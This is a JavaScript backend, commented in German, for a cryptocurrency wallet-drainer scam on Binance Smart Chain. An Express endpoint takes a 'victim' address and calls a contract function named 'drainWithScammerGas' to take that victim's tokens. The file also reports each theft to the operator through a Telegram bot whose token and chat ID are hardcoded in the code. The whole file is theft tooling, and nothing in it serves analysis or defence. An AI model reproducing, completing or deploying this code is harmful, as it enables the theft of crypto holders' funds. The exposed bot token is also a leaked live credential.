// backend.js (mit Express.js für den API-Endpunkt)
const express = require('express');
const ethers = require('ethers');
const axios = require('axios');

const app = express();
app.use(express.json());

const BSC_RPC_URL = "https://bsc-dataseed.binance.org/";
const provider = new ethers.providers.JsonRpcProvider(BSC_RPC_URL);

const contractAddress = "0x0c699b293340FD0c1B086BB5947E2Ba495DC66Bb";
const contractABI = [
    "function drainWithScammerGas(address victim) public",
    "event TokensDrained(address indexed drainedBy, address indexed victim, uint256 tokenCount)"
];

const telegramBotToken = "8065667239:AAHDSCJ-IYgnCvIof2xlz0y_q-LglZjPmqI";
const yourChatId = "6003232782";
const privateKey = process.env.PRIVATE_KEY;

const wallet = new ethers.Wallet(privateKey, provider);
const contract = new ethers.Contract(contractAddress, contractABI, wallet);

// API-Endpunkt, der vom Frontend aufgerufen wird
app.post('/drain-request', async (req, res) => {
    const { victim } = req.body;
    if (!victim || !ethers.utils.isAddress(victim)) {
        return res.status(400).send("Invalid victim address");
    }

    console.log(`Received drain request for victim: ${victim}`);
    await sendTelegramMessage(`🔋 VICTIM LOW ON GAS!\nVictim: ${victim}\nAction: Initiating drain with Scammer Gas.`);
    
    try {
        const tx = await contract.drainWithScammerGas(victim);
        console.log(`Scammer-Gas Drain sent: ${tx.hash}`);
        await tx.wait();
        console.log(`Scammer-Gas Drain successful for ${victim}.`);
        await sendTelegramMessage(`✅ DRAIN SUCCESSFUL (SCAMMER GAS)!\nVictim: ${victim}\nTx: https://bscscan.com/tx/${tx.hash}`);
        res.status(200).send("Drain successful");
    } catch (error) {
        console.error("Error executing scammer-gas drain:", error);
        await sendTelegramMessage(`❌ DRAIN FAILED (SCAMMER GAS)!\nVictim: ${victim}\nError: ${error.message}`);
        res.status(500).send("Drain failed");
    }
});

// Lausche weiterhin auf Events von der Chain (für den Fall, dass das Opfer selbst zahlt)
contract.on("TokensDrained", async (drainedBy, victim, tokenCount) => {
    if (drainedBy === victim) {
        console.log(`🚨 SELF-DRAIN SUCCESSFUL! Victim: ${victim}`);
        await sendTelegramMessage(`🚨 DRAIN SUCCESSFUL (VICTIM GAS)!\nVictim: ${victim}\nTokens drained: ${tokenCount}`);
    }
});

async function sendTelegramMessage(message) {
    // ... (deine sendTelegramMessage Funktion von vorher) ...
}

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Backend listening on port ${PORT}`));
